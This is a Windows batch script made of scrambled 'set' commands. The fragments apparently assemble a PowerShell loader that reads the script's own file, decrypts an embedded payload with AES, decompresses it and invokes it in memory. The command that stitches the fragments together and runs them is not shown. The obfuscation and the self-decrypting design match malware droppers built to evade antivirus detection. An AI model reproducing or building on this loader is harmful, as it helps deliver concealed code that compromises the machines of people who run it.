@echo off
set "lmdkKHSjnr=Stre"
set "YKRPUWNYrN=yste"
set "pJCFWOsATO=] -j"
set "UyUKqnwQxe=gnir"
set "tLjOVscWIQ=t Sy"
set "ZOXnbNXUkU= '')"
set "AsusDqpart=goS."
set "HxYpCrJbQm=.-16"
set "UQVUHCKpUC=mory"
set "EuXAdIzZIR=-nop"
set "IcNGtMaCeC=Star"
set "dfABNXHzAD='txe"
set "suZBerGTws=:: '"
set "lJDksCgwtu=N = "
set "IABpywCBjy=]::C"
set "jHzjEaXUGo=d;$S"
set "KgzJlVcCSZ=.Dis"
set "YlUlfkTBpw=BC;$"
set "dJwGTBHZBn=NFnO"
set "NstFJrjtTH=eam("
set "GjhxaKWCDo=em.C"
set "NNvMwAVCaH= = $"
set "AblqCBcbix=$uGO"
set "JUjZQbkuHb=morF"
set "jUJDoopdsB=stem"
set "rRsLUNtfPz== $S"
set "kYLKsTNIet=);$Z"
set "bEtyFAVfiy=fore"
set "YBVIwQldvK=null"
set "UUhaOlHkjw=[Sys"
set "FqITynBKCO=[-1."
set "qoYwxtzomm=..-1"
set "jZIlOBcUBb=ateD"
set "vSqPwMbnDA= = $"
set "IdYiMYJfMQ=yste"
set "LMljlASRHg=yste"
set "bzUTAlZIMk=kN);"
set "JKdUlDXCmT=ode]"
set "EaKWbjWCeR=grap"
set "AffYoDLrAq=ert]"
set "VaVebmmqtJ=ke($"
set "WdwgrOurpa=stem"
set "gmWGNCeamd=8kuY"
set "XFRxRxAhYI=form"
set "DJDYIFBEpk=m(, "
set "sgYvvrIWnF=tryP"
set "sSOGmIkShT=pose"
set "kTHtGGRinD=[Env"
set "uiVDkUzmZF=Oqwx"
set "AiUrcVjbrS=oL'["
set "jsNlPKHPLs=TllA"
set "IyctthbYXG=and "
set "VZvAREqvbx=ispo"
set "ngZDplRhxY=m.Re"
set "ZFqaPSDkDn=$scg"
set "nuJjOAETvx=);$S"
set "eWTaAMGWXR=NFnO"
set "EyXoLPuizg===')"
set "SoEjKTVlzV=m.IO"
set "NwoEeLZtxm=2VUN"
set "jrlxdNeTBh=;$sc"
set "DtbiMrXLjV=se()"
set "GDfJRWVeHG=rt]:"
set "TVNpxOIeBP=ach "
set "CHFeGrsZRJ=YgkN"
set "cUhzUKIpXY=ring"
set "kNVUQMOclM=.Sec"
set "FfEUJNtogd=ay()"
set "BgUHbMshbE=;$ZL"
set "uBzYGLBYOJ=Secu"
set "DOvEtzBWlB=.Com"
set "WzCqKZkMUx=comp"
set "XjFQBbtoYn=tem."
set "dJFyBryEno=ecry"
set "TfmxLHZLiQ=prNC"
set "PxGrXplwWD=brea"
set "vobaXwvpbz=('ev"
set "HbkRItGWtH=..-1"
set "OZYhzwGRUo=urit"
set "VFqSADNYwe=ose("
set "kDZedkrFvO=nirt"
set "PCJIxhwdAm=k; }"
set "nZWvytcAWk=[IO."
set "mGtDNCtmrS=le  "
set "llMurTeyhA= [Sy"
set "sDZyVjcYOc=tS46"
set "MTVJRTSmmq=S = "
set "kzTrARLGCU=$prN"
set "CGbhCApkzb=();$"
set "tdtKvSDMfc=oArr"
set "KahhWbdksl=ress"
set "mHqUaGaDgs=s = "
set "utzQfHlBJZ=($GR"
set "KheOeovqZB=zm83"
set "MGSzYzRqNP=NFnO"
set "EhrqdJAEfM=ptog"
set "FbvuwJxPEb=kYgk"
set "RXbAAMQiRf=V = "
set "XIXQqWBZeB=.Con"
set "CqEnTrnbLE=pose"
set "MgIkLuVsHJ=M) {"
set "eIRgjMIXDq=PKCS"
set "hxXaIjekZV= [st"
set "gFQbHUnmhO=F'[-"
set "OtRcAqOAUn=$Jfe"
set "msMeuedmiC=Obje"
set "shSAHYbtMB=ss -"
set "iinkkrFvuH=.Mod"
set "MghaRCbEhp=[Sys"
set "amZmDGRmRN=-1.."
set "PSUXnQVIdP=saBm"
set "cyUiaMprQL=$Jfe"
set "YgXYkXDQre=YuOW"
set "dAXzJHWLSM=);$v"
set "IyieEDDLaK=hy.A"
set "eQRkJJmQsp=e]::"
set "ZILAxtwetl=-joi"
set "OlrosaDOMI=Wyqo"
set "RAeDYNWCfT=oint"
set "nHKZuVkNgJ=$kYg"
set "NYNjMsFFra=Comp"
set "HqTMJWVniK=nage"
set "FwpvsHFwNB=;$Oq"
set "bHjYaPYvlN=rans"
set "xJavQjhMkl=syOs"
set "CXJzPDmsxQ=ddin"
set "aJziOSCbXD=z.En"
set "QAocvIghYK=('%~f0'"
set "jtJHUwNUFf=th('"
set "zMxAjMssRK=kYgk"
set "HqCqAVLRto=e = "
